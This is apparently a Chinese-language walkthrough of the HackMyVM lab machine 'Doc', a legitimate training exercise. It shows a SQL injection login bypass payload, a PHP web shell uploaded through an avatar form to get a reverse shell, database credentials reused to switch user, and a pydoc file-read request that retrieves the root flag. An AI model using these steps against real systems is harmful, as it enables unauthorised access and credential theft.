# Doc

2024-11-22 https://hackmyvm.eu/machines/machine.php?vm=Doc

## IP

192.168.5.39

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

访问 80 端口 web 服务，发现需要设置域名 http://doc.hmv/ 在/etc/host 中添加。

使用 gobuster 扫描下目录：

```
http://doc.hmv/admin/login.php
```

尝试登陆，发现错误提示：

```
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('1234567') "}
```

这里可能存在 sql 注入，尝试输入用户名为：`admin' or 1=1 -- -` 登陆进入了系统中，看到 url 中的访问链接为`http://doc.hmv/admin/?page=system_info` 这里可能存在文件包含漏洞，经过测试不存在文件包含漏洞。

寻找其他突破口，发现在用户编辑窗口中，存在图片文件上传功能，尝试修改用户头像，上传 php web shell 上传成功，并且能触发得到反弹的 web shell：

```
用户信息编辑链接：
http://doc.hmv/admin/?page=user/manage_user&id=9

上传的用户头像url地址：
http://doc.hmv/uploads/1732260000_8888.php

www-data@doc:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

发现数据库配置信息：

```
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"be114yTU");
```

/home 发现用户 bella 其中有 user flag 文件，但是没有读取权限。尝试使用 be114yTU 密码切换到 bella 用户，切换成功，获取到了 user flag：

```
bella@doc:~$ cat user.txt
HMVtakemydocs
```

sudo -l 发现：

```
(ALL : ALL) NOPASSWD: /usr/bin/doc
```

网上没找到直接这个程序的漏洞利用，只好自己分析：

```
strings /usr/bin/doc

/usr/bin/pydoc3.9 -p 7890
```

发现 pydoc3.9 以 7890 端口启动，这个版本存在漏洞，可以实现任意文件访问。启动另一个终端，在终端中访问下面链接，就能获得 root flag(同理 也能获得 root 用户的 ssh 登陆密钥)：

```
curl http://localhost:7890/getfile?key=/root/root.txt

<td width="100%"><pre>HMVfinallyroot
</pre></td></tr></table></div>
```

如果想获得 root 的 shell，发现本地 127.0.0.1 开放了 21 端口，是一个 ssh 端口，但是外界访问不了，需要使用端口转发工具，这里就不做演示了。
